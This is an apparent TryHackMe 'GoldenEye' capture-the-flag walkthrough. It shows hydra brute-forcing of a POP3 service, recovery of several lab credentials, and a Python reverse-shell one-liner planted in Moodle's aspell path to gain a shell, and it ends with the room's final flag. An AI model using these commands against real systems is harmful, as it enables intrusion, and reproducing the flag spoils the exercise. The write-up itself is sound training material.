# Tryhackme.com Room : Golden Eye
`https://tryhackme.com/room/goldeneye`


# Instance
```
export IP=10.10.231.49
```

# Nmap
```
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING UIDL USER AUTH-RESP-CODE RESP-CODES STLS SASL(PLAIN) TOP
|_ssl-date: TLS randomness does not represent time
```

Webserver home page is some console animation telling to login at `http://$IP/sev-home`.Its Htaccess login

When looking at terminal.js source we get :
```
Boris, make sure you update your default password. 
My sources say MI6 maybe planning to infiltrate. 
Be on the lookout for any suspicious network traffic....

I encoded you p@ssword below...

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

BTW Natalya says she can break your codes

```

Username is probably `boris`
The password is htmlencoded : `InvincibleHack3r`


We get on another webpage.
```
Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
```

We already found an smtp server on port 25 but maybe there is another one.
We port scan higher ports to find the smtp 


We find this in html comments :
```
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
```

we run hydra on the pop3 server 
```
hydra -L logins -P /usr/share/wordlists/fasttrack.txt $IP -s 55007 pop3
```
Where logins contains 
```
natalya
boris
```

We find
```
boris:secret1!
natalya:bird
```

Boris Message's
```
From: root@ubuntu
Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
```

```
From: natalya@ubuntu

Boris, I can break your codes!
```

```
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

Natalya messages:

```
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
```

```
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

```

From last natalya message, we modify our host so that `$IP` point to `severnaya-station.com` and access `severnaya-station.com/gnocertdir` via browser.


In the messages we find a message from `Dr Doak`. We infer the username `doak`.

We bruteforce the pop3 server again `hydra -l doak -P /usr/share/wordlists/fasttrack.txt $IP -s 55007 pop3`

We get
```
doak:goat
```

We login in pop3 server and find this email :

```
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

In the moodle private files of this user we find a `s3cret.txt` file
```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.root
```

We find an image

Using `hexiftool` we find this base64 string in `Image Description` Field
```
eFdpbnRlcjE5OTV4IQ==
```

Which give the Admin password :
```
xWinter1995x!
```

In the admin panel, we find `site administration->server->System paths`
We set a python reverse shell in `path to aspell`
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.245.79",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We got to change the default spellchecker in `site administration->Plugins->Text Editors-> TinyMCE HTML`

We create a dummy blog entry and press the spell check button.
we get a reverse shell.

We stabilize the shell a bit with
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


Final flag
```
568628e0d993b1973adc718237da6e93
```

